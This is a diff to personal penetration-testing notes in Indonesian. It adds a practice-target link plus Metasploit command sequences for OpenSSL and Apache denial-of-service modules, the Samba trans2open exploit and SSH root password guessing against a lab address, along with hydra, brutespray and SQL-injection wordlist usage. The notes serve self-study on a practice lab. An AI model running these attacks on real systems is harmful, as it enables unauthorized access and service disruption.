@@ -62,6 +62,10 @@ Bug bounty website
 hackerone.com
 bugcrowd.com
 
+owaps
+sample web yang bisa dihack untuk kita belajar, link install dibawah
+https://sourceforge.net/projects/owaspbwa/
+
 Metasploit
 
 smb enumusers & version
@@ -83,25 +87,37 @@ msf6 > search tcp
 
 
 $ msfconsole
-msf6 > search openssl 0.9.8
+
+cari open ssl (ddos)
+msf6 > search openssl 0.9.8 
 msf6 > use 1
 msf6 > auxiliary(dos/ssl/dtls_fragment_overflow) > set RHOSTS <192.168.0.75>
 msf6 > auxiliary(dos/ssl/dtls_fragment_overflow) > options
 msf6 > auxiliary(dos/ssl/dtls_fragment_overflow) > run                  kalau gagal dia gak ada efek apapun
 msf6 > auxiliary(dos/ssl/dtls_fragment_overflow) > exit
 
-karena gagal cari exploit lain :
+karena gagal cari exploit lain (samba) :
 msf6 > search trans2open              trans2open bagian dari samba
 msf6 > use 1
 msf6 > exploit(linux/samba/trans2open) > set RHOSTS <192.168.0.75>
 msf6 > exploit(linux/samba/trans2open) > run
 
-karena gagal cari exploit lain :
+karena gagal cari exploit lain (apache) :
 msf6 > search apache 2.2.14
 msf6 > use 0
 msf6 > auxiliary(dos/http/apache_mod_isapi) > set RHOSTS <192.168.0.75>
 msf6 > auxiliary(dos/http/apache_mod_isapi) > run               success
 
+ssh login password list :
+msfconsole
+msf6 > search ssh
+msf6 > use 10
+msf6 > auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.0.75
+msf6 > auxiliary(scanner/ssh/ssh_login) > options
+msf6 > auxiliary(scanner/ssh/ssh_login) > set pass_file /usr/share/wordlists/.../passwords.txt
+msf6 > auxiliary(scanner/ssh/ssh_login) > set username root
+msf6 > auxiliary(scanner/ssh/ssh_login) > set verbose
+msf6 > auxiliary(scanner/ssh/ssh_login) > run
 
 Nikto > lihat outdated program dan sub program dan vurnerablitynya
 $ nikto -h <http://192.168.0.1>
@@ -115,8 +131,6 @@ hydra -L <usernames.txt> -P <passwords.txt> <ssh://192.168.0.75> -t 4 -V
 -V = Verbose
 
 brutespray      buka password dengan bruteforce
-kalau belom diinstall maka install dulu
-$ sudo apt install brutespray
 brutespray dapat baca format nmap yang di save ke xml, jadi kita harus save xml hasil dari nmap
 $ nmap -A -oX <file.xml> <192.168.0.75>
 
@@ -133,3 +147,11 @@ $ brutespray -f <file.xml> -U <usernames.txt> -P <passwords.txt> -c
 -c = continue meskipun sudah dapat username dan password yang cocok
 
 kalau sudah brutespray akan buat file hasilnya secara otomatis
+
+wordlists
+wordlists adalah aplikasi buat lihat daftar passsword yang umum jadi gak perlu bruteforce
+untuk sql injection: /usr/share/wordlists/wfuzz/Injections/SQL.txt
+
+burpsuite
+aplikasi untuk melihat proses jalannya website satu per satu dan juga sql injection
+untuk sql injection bisa load payload ke /usr/share/wordlists/wfuzz/Injections/SQL.txt
